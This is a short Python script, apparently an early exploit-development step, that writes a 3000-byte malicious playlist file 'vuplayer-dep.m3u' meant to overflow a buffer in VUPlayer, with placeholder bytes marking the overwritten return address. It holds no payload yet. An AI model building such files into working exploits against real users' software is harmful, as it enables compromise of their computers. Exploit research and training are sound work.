import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "B" * 4
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()